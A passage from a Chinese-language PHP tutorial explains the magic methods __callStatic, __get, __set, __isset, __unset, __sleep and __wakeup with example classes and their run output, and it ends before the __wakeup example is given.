<p>该方法同样有两个参数，第一个参数是调用的那个不存在的静态方法名 ，第二个参数是一个数组 ( array ) ，是传递给不存在静态方法的所有参数组成的数组</p>
<p><code>__callStatic()</code> 方法的原型如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__callStatic( string $func_name,  array $args )</span><br><span class="line">&#123;</span><br><span class="line">    // 一些代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>范例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    function say()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;你好，世界\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static function __callStatic($funName, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;你调用的静态方法：&quot; . $funName . &quot;( 参数：&quot; ;  // 输出静态方法名</span><br><span class="line">        print_r($arguments); // 输出调用静态方法时传递的参数</span><br><span class="line">        echo &quot;) 不存在\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person = new Person();</span><br><span class="line"></span><br><span class="line">$person::run(&quot;teacher&quot;); // 因为该静态方法不存在，所以会自动调用 __callStatic()</span><br><span class="line"></span><br><span class="line">$person::eat(&quot;apple&quot;, $with=&#x27;Hero&#x27;);</span><br><span class="line">$person-&gt;say();</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php</span><br><span class="line">你调用的静态方法：run( 参数：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; teacher</span><br><span class="line">)</span><br><span class="line">) 不存在</span><br><span class="line">你调用的静态方法：eat( 参数：Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; apple</span><br><span class="line">    [1] =&gt; Hero</span><br><span class="line">)</span><br><span class="line">) 不存在</span><br><span class="line">你好，世界</span><br></pre></td></tr></table></figure>
<h1>__get()</h1>
<p>前置知识，可以问ai：请解释以下编程概念的区别：函数（Function）、方法（Method）、属性（Property）并结合实际代码示例，说明它们在编程中的具体应用。</p>
<p>当我们试图访问 PHP 对象中的不存在的属性或者私有的属性时，程序会抛出异常并且停止执行，例如下面的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    private $name;</span><br><span class="line">    private $age;</span><br><span class="line"></span><br><span class="line">    function __construct($name=&quot;&quot;, $age=1)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = $age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&quot;Yufei&quot;, 30);  // 使用参数 &quot;Yufei&quot; 和 30 初始化一个对象</span><br><span class="line">echo &quot;Name：&quot; . $person-&gt;name . &quot;\n&quot;;</span><br><span class="line">echo &quot;Sex:  &quot; . $person-&gt;sex . &quot;\n&quot;; // 因为程序终止执行，所以这一条语句不会执行</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php</span><br><span class="line"></span><br><span class="line">Fatal error: Uncaught Error: Cannot access private property Person::$name in /Users/yufei/php/demo.php:15</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br><span class="line">  thrown in /Users/yufei/php/demo.php on line 15</span><br></pre></td></tr></table></figure>
<p>出现这种异常是我们不想看到的，一种解决办法就是给私有的变量定义一个公开的访问方法。但如果是一个不存在的变量，就没办法定义一个公开的方法了。</p>
<p>没有其它办法了吗？</p>
<p>答案是显而易见的，因为我们的标题就是 <code>__get()</code> 魔术方法啊</p>
<p><strong><code>__get()</code> 魔术方法</strong></p>
<p>当一个类定义了一个 <code>__get()</code> 魔术方法后，我们就可以获取该类的实例的私有属性或不存在的属性而不犯错，这里所说的获取，是指获取其值。</p>
<p>该方法的原型如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public mixed function __get( string $propertyName)</span><br><span class="line">&#123;</span><br><span class="line">   // 一些代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该方法只有一个参数，就是要获取的属性名称，且该函数可以返回任意数据类型，且必须有返回值。</p>
<p><strong>范例</strong></p>
<p>下面的方法，我们为 <code>Person</code> 定义了魔术方法 <code>__get()</code>，从而解决上面出现的异常问题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    private $name;</span><br><span class="line">    private $age;</span><br><span class="line"></span><br><span class="line">    function __construct($name=&quot;&quot;, $age=1)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = $age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($propertyName)</span><br><span class="line">    &#123;   </span><br><span class="line">        if ($propertyName == &quot;age&quot;) &#123;</span><br><span class="line">            if ($this-&gt;age &gt; 30) &#123;</span><br><span class="line">                return $this-&gt;age - 10;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                return $this-&gt;$propertyName;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return $this-&gt;$propertyName;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&quot;Yufei&quot;, 30);   // 使用参数 &quot;Yufei&quot; 和 30 初始化一个对象</span><br><span class="line"></span><br><span class="line">echo &quot;Name：&quot; . $person-&gt;name . &quot;\n&quot;;   // 当访问不可访问的属性时，会自动调用 __get() 方法</span><br><span class="line">echo &quot;Age：&quot; .  $person-&gt;age . &quot;\n&quot;;    // 返回不一样的值</span><br><span class="line">echo &quot;Sex: &quot; .  $person-&gt;sex . &quot;\n&quot;;    // 当访问不存在的属性时</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php</span><br><span class="line">Name：Yufei</span><br><span class="line">Age：30</span><br><span class="line">Sex: </span><br></pre></td></tr></table></figure>
<p>可以看到，当我们定义了 <code>__get()</code> 方法，即使属性不存在，也会返回一个 NULL 值</p>
<p><strong>类的实例内部访问不存在的属性返回 NULL</strong></p>
<p>这里有一个知识点，就是类的实例内部访问一个不能存在的属性，会返回 <code>NULL</code> 值，可以看如下的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    private $name;</span><br><span class="line">    private $age;</span><br><span class="line"></span><br><span class="line">    function say()</span><br><span class="line">    &#123;</span><br><span class="line">        var_dump($this-&gt;sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&quot;Yufei&quot;, 30);   // 使用参数 &quot;Yufei&quot; 和 30 初始化一个对象</span><br><span class="line">$person-&gt;say();</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php</span><br><span class="line">NULL</span><br></pre></td></tr></table></figure>
<h1>__set()</h1>
<p>在 PHP 魔术方法 - __get() 章节中，我们学习了如何访类实例的不存在的或私有的属性。那么，如果们要对这些属性进行赋值，或者改变它们的值，又要怎么做呢？</p>
<p>我们先来看看默认情况下会不会也报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    private $name;</span><br><span class="line">    private $age;</span><br><span class="line"></span><br><span class="line">    function __construct($name=&quot;&quot;, $age=1)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = $age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&quot;Yufei&quot;, 30);  // 无参数创建实例</span><br><span class="line"></span><br><span class="line">$person-&gt;name = &quot;Yufei&quot;;</span><br><span class="line">$person-&gt;sex  = &quot;Male&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;Name：&quot; . $person-&gt;name . &quot;\n&quot;;</span><br><span class="line">echo &quot;Sex:  &quot; . $person-&gt;sex . &quot;\n&quot;; // 因为程序终止执行，所以这一条语句不会执行</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php </span><br><span class="line"></span><br><span class="line">Fatal error: Uncaught Error: Cannot access private property Person::$name in /Users/yufei/php/demo.php:16</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br><span class="line">  thrown in /Users/yufei/php/demo.php on line 16</span><br></pre></td></tr></table></figure>
<p>看出错的结果在 16 行，也就是 <code>$person-&gt;name = &quot;Yufei&quot;;</code></p>
<p>这说明什么 ？</p>
<p>说明 「 给类实例的不存在的或私有的属性赋值，同样会抛出异常 」</p>
<p>同样的，解决办法也很简单，就是给类定义一个 <code>__set()</code> 魔术方法</p>
<p><strong><code>__set()</code> 魔术方法</strong></p>
<p>魔术方法 <code>__set()</code> 用来给类的实例的不存在的属性或不可访问的属性赋值。</p>
<p>该方法的原型如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function __set($property, $value)</span><br><span class="line">&#123;</span><br><span class="line">    // 一些代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该方法有两个参数，第一个参数 <code>$property</code> 是不存在或不可访问的实例的属性，第二个参数 <code>$value</code> 是实际要赋的值。</p>
<p>该方法可以有返回值，也可以没有返回值，完全由开发者自己决定</p>
<p><strong>范例</strong></p>
<p>为了修复一开始的异常，我们为 <code>Person</code> 类定义一个 <code>__set()</code> 方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    private $name;</span><br><span class="line">    private $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,  $age=25)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set($property, $value) &#123;</span><br><span class="line">        if ($property==&quot;age&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            if ($value &gt; 150 || $value &lt; 0) &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;$property = $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo &quot;我的名字是： &quot;.$this-&gt;name.&quot;, 我 &quot;.$this-&gt;age.&quot; 岁了&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$Person=new Person(&quot;Yufei&quot;, 25); </span><br><span class="line">$Person-&gt;name = &quot;Hero&quot;;     // 因为定义了 __set() 方法，所以我们可以给 $name 属性赋值</span><br><span class="line"></span><br><span class="line">$person-&gt;age = 16;   // 同样的，也可以给 $age 属性赋值</span><br><span class="line">$person-&gt;age = 160;  // 因为 160 不符合要求，所以 $age 还是保持原样</span><br><span class="line">$person-&gt;say();      // 输出 print：My name is Lili, I&#x27;m 16 years old.</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php </span><br><span class="line">我的名字是： Hero, 我 16 岁了</span><br></pre></td></tr></table></figure>
<p><strong>使用 <code>__set()</code> 给一个不存在的属性赋值时，该属性的访问级别问题</strong></p>
<p>使用 <code>__set()</code> 给一个不存在的属性赋值时，该属性的访问级别是默认的 <code>public</code> ，请看下面的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __set($property, $value) &#123;</span><br><span class="line">        $this-&gt;$property = $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person();</span><br><span class="line">$person-&gt;name = &#x27;Yufei&#x27;;</span><br><span class="line">echo $person-&gt;name, &quot;\n&quot;;</span><br></pre></td></tr></table></figure>
<p>输出结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php </span><br><span class="line">Yufei</span><br></pre></td></tr></table></figure>
<h1>__isset()</h1>
<p>在我们讨论 <code>__issset()</code> 魔术方法之前，我们先来讨论下 <code>isset()</code> 方法。 <code>isset()</code> 方法主要用于判断一个变量或实例的一个属性是否定义。</p>
<p>如果变量或实例的属性不存在，或被赋值为 <code>NULL</code>，就会返回 <code>false</code>，其它情况下一律返回 <code>true</code>，哪怕被赋值为 <code>false</code>、<code>0</code> 、<code>''</code></p>
<p><code>isset()</code> 通常用于判断某个变量是否设置，当然，也可以在实例的外部判断实例的某个属性是否设置，这通常有两个场景</p>
<ol>
<li>如果参数是一个公开 ( public ) 的属性，那么可以直接使用 <code>isset()</code> 来判断该属性是否设置</li>
<li>如果参数是一个私有 ( private ) 的属性，那么 <code>isset()</code> 就不能正常工作了</li>
</ol>
<p>那么对于私有的属性，我们就判断它是否设置了吗 ？</p>
<p>当然不是，只要我们在类中定义了魔术方法 <code>__isset()</code> ，那么就可以在实例的外部使用 <code>isset()</code> 方法来判断某个私有属性是否设置</p>
<p><strong>魔术方法 <code>__isset()</code></strong></p>
<p>只要一个类定义了 <code>__isset()</code> 魔术方法，我们就可以使用 <code>isset()</code> 来判断类的实例的某个私有属性是否 「 设置 」</p>
<p>这个 「 设置 」 我们加了中文竖括号，原因是 <code>__isset()</code> 内部判断是否设置的标准可以不是 <code>NULL</code>。也就是说</p>
<p>「 只要 <code>__isset()</code> 方法返回 <code>true</code> ，那么 <code>isset()</code> 方法就返回 <code>true</code>，反之，则返回 <code>false</code> 」</p>
<p>当定义了 <code>__isset()</code> 魔术方法后，只要使用 <code>isset()</code> 方法实例的私有属性或不存在的属性，都会自动调用 <code>__isset()</code> 魔术方法</p>
<p>该方法的原型如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public bool function __isset( $propertyName ) </span><br><span class="line">&#123;</span><br><span class="line">    // 其它代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该方法接收一个且只有一个参数，那就是要判断的属性名，而返回值为一个 bool 类型</p>
<p><strong>范例</strong></p>
<p>下面的代码，我们故意设置 <code>$name</code> 变量为公开可见的，<code>$age</code> 变量默认为 <code>private</code> 的，且忽略定义 <code>$sex</code> 变量，然后我们看看 <code>__isset()</code> 方法的返回值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    private $age;</span><br><span class="line">    private $phone;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,  $age=25)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @param $content</span><br><span class="line">     *</span><br><span class="line">     * @return bool</span><br><span class="line">     */</span><br><span class="line">    public function __isset($property) &#123;</span><br><span class="line">        echo &quot;&#123;$property&#125; 属性是私有的或为定义， __isset() 方法会被自动调用\n&quot;;</span><br><span class="line">        return isset($this-&gt;$property);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&quot;Yufei&quot;, 25); // Initially assigned.</span><br><span class="line"></span><br><span class="line">var_dump(isset($person-&gt;name));</span><br><span class="line">echo &quot;\n\n&quot;;</span><br><span class="line"></span><br><span class="line">var_dump(isset($person-&gt;age));</span><br><span class="line">echo &quot;\n\n&quot;;</span><br><span class="line"></span><br><span class="line">var_dump(isset($person-&gt;sex));</span><br><span class="line">echo &quot;\n\n&quot;;</span><br><span class="line"></span><br><span class="line">var_dump(isset($person-&gt;phone));</span><br><span class="line">echo &quot;\n\n&quot;;</span><br></pre></td></tr></table></figure>
<p>输出结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php </span><br><span class="line">bool(true)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">age 属性是私有的或为定义， __isset() 方法会被自动调用</span><br><span class="line">bool(true)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sex 属性是私有的或为定义， __isset() 方法会被自动调用</span><br><span class="line">bool(false)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phone 属性是私有的或为定义， __isset() 方法会被自动调用</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure>
<h1>__unset()</h1>
<p>如果我们要销毁一个变量，通常有两种方法，一个是使用 <code>unset()</code> ，另一个是直接赋值为 <code>NULL</code>。对于普通的变量，几乎可以把两者画上等号。但对于实例的属性，那么结果也是一样，但过程是不一样的。</p>
<p>首先，要说明的是，使用 <code>unset()</code> 实例一个不存在的属性并不会报错，但 <code>unset()</code> 一个私有的或不可见的属性，会报错，例如下面的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    private $name;</span><br><span class="line"></span><br><span class="line">    public function __construct($name = &#x27;&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&#x27;Yufei&#x27;);</span><br><span class="line"></span><br><span class="line">unset($person-&gt;age);</span><br><span class="line">unset($person-&gt;name);</span><br></pre></td></tr></table></figure>
<p>输出结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php </span><br><span class="line"></span><br><span class="line">Fatal error: Uncaught Error: Cannot access private property Person::$name in /Users/yufei/php/demo.php:16</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br><span class="line">  thrown in /Users/yufei/php/demo.php on line 16</span><br></pre></td></tr></table></figure>
<p>可以看到 <code>unset($person-&gt;age);</code> 并没有报错，反而是 <code>unset($person-&gt;name)</code> 报错了。</p>
<p>为了解决这个问题，也为了能在 unset 一个不存在的属性时有个提示，我们可以为类定义 <code>__unset()</code> 魔术方法</p>
<p><strong><code>__unset()</code> 魔术方法</strong></p>
<p>如果一个类定义了魔术方法 <code>__unset()</code> ，那么我们就可以使用 <code>unset()</code> 函数来销毁类的私有的属性，或在销毁一个不存在的属性时得到通知。</p>
<p>实际上有没有销毁那个属性，取决于 <code>__unset()</code> 的具体实现，也就是，我们也可以定义一个空的实现</p>
<p><code>__unset()</code> 魔术方法的原型如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function __unset( $property )</span><br><span class="line">&#123;</span><br><span class="line">    // 一些销毁属性的方法，一般是调用 unset()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>范例</strong></p>
<p>下面的范例，我们为类 <code>Person</code> 定义一个 <code>__unset()</code> 方法，然后再销毁它的实例的私有属性 <code>$name</code> 和不存在的属性 <code>$age</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    private $name;</span><br><span class="line"></span><br><span class="line">    public function __construct($name = &#x27;&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __unset( $property ) &#123;</span><br><span class="line">        echo &quot;在实例外部调用 unset() 函数销毁实例的不可见属性或不存在的属性时会自动调用该方法\n&quot;;</span><br><span class="line">        echo &quot;你正在销毁 &#123;$property&#125;\n&quot;;</span><br><span class="line">        unset($this-&gt;$property);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&#x27;Yufei&#x27;);</span><br><span class="line"></span><br><span class="line">unset($person-&gt;age);</span><br><span class="line">unset($person-&gt;name);</span><br></pre></td></tr></table></figure>
<p>输出结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php </span><br><span class="line">在实例外部调用 unset() 函数销毁实例的不可见属性或不存在的属性时会自动调用该方法</span><br><span class="line">你正在销毁 age</span><br><span class="line">在实例外部调用 unset() 函数销毁实例的不可见属性或不存在的属性时会自动调用该方法</span><br><span class="line">你正在销毁 name</span><br></pre></td></tr></table></figure>
<p>发现没有 ？ 当我们销毁一个不存在的属性时，也会自动调用 <code>__unset()</code> 函数</p>
<h1>__sleep()</h1>
<p>如果要将一个对象保存起来，那么你一定会用到 <code>serialize()</code> 会把实例的所有属性，不管是公开可见的还是私有的，都给序列化了，例如下面的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public  $name;</span><br><span class="line">    public  $age;</span><br><span class="line">    private $sex = &quot;Male&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name = &#x27;&#x27;,$age=22)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = $age;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&#x27;Yufei&#x27;,30);</span><br><span class="line"></span><br><span class="line">echo serialize($person);</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php </span><br><span class="line">O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;Yufei&quot;;s:3:&quot;age&quot;;i:30;s:11:&quot;Personsex&quot;;s:4:&quot;Male&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>但这往往不是我们所需要的，而且，我们有可能也要剔除某些公开的属性，比如 <code>$age</code>，这种情况下，我们要怎么做呢 ？</p>
<p>别急，哈哈，<a href="https://twle.cn/l/yufei/php/php-basic-index.html">PHP</a> 提供了魔术方法 <code>__sleep()</code> 可以定制序列化结果</p>
<p><strong>魔术方法 <code>__sleep()</code></strong></p>
<p>魔术方法 <code>__sleep()</code> ，我觉得是 PHP 取的，为数不多的，名字特别有意思的函数了，把一个对象序列化成为字符串，就可以保存起来了，保存在文件系统中，或数据库中，看起来不就是 「 睡着 」了一样么 ？</p>
<p>当调用 <code>serialize()</code> 函数序列化一个实例时，会首先检查该实例是否存在 <code>__sleep()</code> 方法，如果该方法存在，则自动调用，否则使用默认的序列化方式。</p>
<p>我们可以给一个类定义 <code>__sleep()</code> 方法来定制类的实例的序列化输出结果，剔除哪些不是必须序列化的属性，比如保存了超大数据的属性。</p>
<p><code>__sleep()</code> 方法的原型如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public array function __sleep()</span><br><span class="line">&#123;</span><br><span class="line">    // 定制序列化结果</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该魔术方法没有任何参数，但有且必须一定有返回值，返回值是一个数组，它包含了想要序列化的该实例的属性名</p>
<blockquote>
<p>其实，我们还可以在 <code>__sleep()</code> 方法给实例添加一些属性</p>
</blockquote>
<p><strong>范例</strong></p>
<p>下面的代码，我们将修改本章节最开始的范例，剔除 <code>$sex</code> 属性，并且添加一些额外的属性 <code>$school</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">        $this-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @return array</span><br><span class="line">     */</span><br><span class="line">    public function __sleep() &#123;</span><br><span class="line">        echo &quot;一但使用 serialize() 方法序列化实例时，会自动调用此方法\n&quot;;</span><br><span class="line">        $this-&gt;name = base64_encode($this-&gt;name);</span><br><span class="line">        $this-&gt;school = &#x27;HuaQiao&#x27;;</span><br><span class="line">        return array(&#x27;name&#x27;, &#x27;age&#x27;,&#x27;school&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&#x27;Yufei&#x27;);</span><br><span class="line">echo serialize($person),&quot;\n&quot;;</span><br></pre></td></tr></table></figure>
<p>输出结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php </span><br><span class="line">一但使用 serialize() 方法序列化实例时，会自动调用此方法</span><br><span class="line">O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;WXVmZWk=&quot;;s:3:&quot;age&quot;;i:25;s:6:&quot;school&quot;;s:7:&quot;HuaQiao&quot;;&#125;</span><br></pre></td></tr></table></figure>
<h1>__wakeup()</h1>
<p>上一章节中我们已经见过了序列化函数 <code>serialize()</code> ，其实，与它功能相反的，还存在一个函数 <code>unserialize()</code> ，用来将 <code>serialize()</code> 序列化的结果反序列化回一个 PHP 对象，例如重建数据库连接，或其它的初始化操作。</p>
<p>例如下面的代码，将我们上一章节中序列化的字符串给反系列化回去。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age  = $age;</span><br><span class="line">        $this-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = new Person(&#x27;Yufei&#x27;,30,&#x27;Male&#x27;);</span><br><span class="line"></span><br><span class="line">$s = serialize( $person );</span><br><span class="line">echo $s,&quot;\n&quot;;</span><br><span class="line">$person2 = unserialize( $s );</span><br><span class="line">echo $person2-&gt;name,&quot;\n&quot;;</span><br><span class="line">echo $person2-&gt;age,&quot;\n&quot;;</span><br><span class="line">echo &quot;\n&quot;;</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[yufei@localhost php]$ php demo.php </span><br><span class="line">O:6:&quot;Person&quot;:3:&#123;s:3:&quot;sex&quot;;s:4:&quot;Male&quot;;s:4:&quot;name&quot;;s:5:&quot;Yufei&quot;;s:3:&quot;age&quot;;i:30;&#125;</span><br><span class="line">Yufei</span><br><span class="line">30</span><br></pre></td></tr></table></figure>
<p>但如果我们要再反序列化的时候修改某些数据，或创建一个数据库连接，或添加一些属性，要怎么做呢 ？</p>
<p><a href="https://twle.cn/l/yufei/php/php-basic-index.html">PHP</a> 提供了 <code>__wakeup()</code> 魔术方法，当 <code>unserialize()</code> 反序列化一个对象成功后会自动调用该对象的定义的 <code>__wakeup()</code> 魔术方法，如果定义了的话。</p>
<p><strong>魔法函数 <code>__wakeup()</code></strong></p>
<p>当使用 <code>unserialize()</code> 反序列化一个对象成功后，会自动调用该对象的 <code>__wakup()</code> 魔术方法。</p>
<p>该方法的原型如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function __wakeup()</span><br><span class="line">&#123;</span><br><span class="line">    // 一些其它初始化操作</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该魔术方法既没有参数，也没有返回值</p>
<p><strong>范例</strong></p>
<p>下面的范例，我们再反序列化 <code>person</code> 对象的时候顺便给它添加一些额外的属性，例如 <code>school</code>，同时也将年龄修改成 <code>520</code></p>
